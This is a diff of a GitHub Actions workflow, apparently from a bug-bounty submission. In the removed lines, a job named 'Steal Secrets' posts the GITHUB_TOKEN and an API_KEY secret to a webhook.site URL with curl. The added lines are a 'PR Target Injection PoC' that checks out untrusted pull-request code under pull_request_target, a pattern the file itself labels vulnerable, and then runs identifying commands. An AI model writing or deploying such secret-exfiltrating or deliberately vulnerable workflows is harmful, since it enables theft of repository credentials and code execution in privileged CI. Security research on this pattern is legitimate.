@@ -1,10 +1,24 @@
-name: Steal Secrets
-on: [push, pull_request_target]
+name: PR Target Injection PoC
+
+on:
+  pull_request_target:
+
+permissions:
+  contents: read
+  pull-requests: write
+
 jobs:
-  steal:
+  poc:
     runs-on: ubuntu-latest
+
     steps:
-      - run: |
-          echo "Stealing all GitHub secrets!"
-          curl -X POST https://webhook.site/71cfe1cd-9d02-417a-93cd-2b8bd22bc794  \
-            -d "token=${{ secrets.GITHUB_TOKEN }}, other=${{ secrets.API_KEY }}"
+      - name: Checkout PR code (VULNERABLE PATTERN)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: PoC Execution
+        run: |
+          echo "H1-vishalkumar9570"
+          echo "PR SHA: ${{ github.event.pull_request.head.sha }}"
+          whoami
